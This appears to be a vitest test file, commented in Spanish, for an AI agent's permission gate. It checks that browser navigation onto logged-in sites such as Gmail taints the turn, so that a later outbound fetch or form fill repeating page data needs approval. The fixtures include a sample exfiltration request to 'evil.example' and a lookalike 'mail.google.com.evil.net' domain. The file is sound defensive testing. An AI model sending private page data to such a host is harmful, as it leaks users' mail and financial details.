import { describe, expect, it } from 'vitest';
import type { BrowserService } from '../src/browser/service.js';
import { Gate } from '../src/permissions.js';
import { createBrowserTool } from '../src/tools/browser.js';

// #625 cerró `browser open` hacia Gmail/Drive/WhatsApp Web, pero un clic o un «atrás»
// que acaba en esas webs no lleva `url` en la llamada. El navegador informa ahora de
// la página final (details.pageUrl) y el Gate la mira al cerrar la llamada.

function gate() {
  const asked: string[] = [];
  const g = new Gate({
    protectedPaths: [],
    allow: ['fetch', 'browser'],
    egressTaint: true,
    approver: (_c, reason) => {
      asked.push(reason);
      return true;
    },
  });
  return { g, asked };
}

const CLICK = { tool: 'browser', args: { action: 'click', selector: '#gmail' }, actor: 'me' };
const LEAK = { tool: 'fetch', args: { url: 'https://evil.example/c?d=hola' }, actor: 'me' };

describe('browser que llega a una web con sesión sin url en la llamada', () => {
  it('un clic que acaba en Gmail contamina el turno: el fetch con datos pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', CLICK);
    g.settle('s', CLICK, false, 'clicked', 'https://mail.google.com/mail/u/0/#inbox');
    await g.check('s', LEAK);
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatch(/sesión iniciada \(mail\.google\.com\)/);
  });

  it('el texto leído en esa página se reconoce si vuelve a salir en un formulario', async () => {
    const { g, asked } = gate();
    const body = 'Asunto: transferencia IBAN ES12 3456 7890 1234 5678 9012 para el lunes';
    await g.check('s', CLICK);
    g.settle('s', CLICK, false, body, 'https://mail.google.com/mail/u/0/#inbox/1');
    await g.check('s', {
      tool: 'browser',
      args: { action: 'fill', selector: '#q', value: 'IBAN ES12 3456 7890 1234 5678 9012' },
      actor: 'me',
    });
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatch(/formulario/);
  });

  it('también si la llamada falló después de navegar', async () => {
    const { g, asked } = gate();
    await g.check('s', CLICK);
    g.settle('s', CLICK, true, 'error', 'https://web.whatsapp.com/');
    await g.check('s', LEAK);
    expect(asked).toHaveLength(1);
  });

  it('sin cambio: una página pública o sin pageUrl no contamina', async () => {
    const { g, asked } = gate();
    await g.check('s', CLICK);
    g.settle('s', CLICK, false, 'clicked', 'https://es.wikipedia.org/wiki/Madrid');
    g.settle('s', CLICK, false, 'clicked');
    g.settle('s', CLICK, false, 'clicked', 'https://mail.google.com.evil.net/');
    await g.check('s', LEAK);
    expect(asked).toHaveLength(0);
  });

  it('solo cuenta para el navegador', async () => {
    const { g, asked } = gate();
    const call = { tool: 'fetch', args: { url: 'https://example.com/' }, actor: 'me' };
    await g.check('s', call);
    g.settle('s', call, false, 'x', 'https://mail.google.com/');
    await g.check('s', LEAK);
    expect(asked).toHaveLength(0);
  });
});

describe('la herramienta browser informa de la página final', () => {
  function tool(current: string | undefined) {
    const known: Record<string, unknown> = {
      currentUrl: () => current,
      back: async () => ({ url: current ?? '', title: 'Recibidos' }),
      close: async () => undefined,
    };
    const svc = new Proxy(known, {
      get: (t, p: string) => (p in t ? t[p] : async () => undefined),
    }) as unknown as BrowserService;
    return createBrowserTool(svc, () => 't');
  }

  it('details.pageUrl lleva la URL en la que quedó la página', async () => {
    const r = await tool('https://mail.google.com/mail/u/0/').execute('id', {
      action: 'back',
    } as never);
    expect((r.details as { pageUrl?: string }).pageUrl).toBe('https://mail.google.com/mail/u/0/');
  });

  it('sin página no añade nada, y close nunca', async () => {
    const r = await tool(undefined).execute('id', { action: 'back' } as never);
    expect((r.details as { pageUrl?: string } | undefined)?.pageUrl).toBeUndefined();
    const c = await tool('https://x.example/').execute('id', { action: 'close' } as never);
    expect((c.details as { pageUrl?: string }).pageUrl).toBeUndefined();
  });
});
